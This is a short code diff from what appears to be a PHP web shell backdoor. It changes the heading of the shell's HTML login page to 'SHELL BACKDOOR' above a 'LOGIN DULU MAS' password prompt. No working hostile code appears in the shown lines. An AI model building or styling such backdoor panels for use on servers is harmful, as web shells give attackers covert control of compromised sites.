@@ -49,7 +49,7 @@ function login_shell() {
 <body class="text-center text-light">
     <div class="container text-center mt-3">
         <h1> ❝𝗕𝗛𝗔𝗣𝗢𝗠𝗘𝗧❞ </h1>
-        <h5> ᴀɢɪᴏꜱ ᴏ ꜱᴀᴛᴀɴᴀꜱ </h5><hr/>
+        <h5> 𝗦𝗛𝗘𝗟𝗟 𝗕𝗔𝗖𝗞𝗗𝗢𝗢𝗥 </h5><hr/>
         <p class="mt-3 font-weight-bold"><i class="fa fa-terminal"></i> 𝗟𝗢𝗚𝗜𝗡 𝗗𝗨𝗟𝗨 𝗠𝗔𝗦 </p>
         <form method="post">
             <div class="form-group input-group">
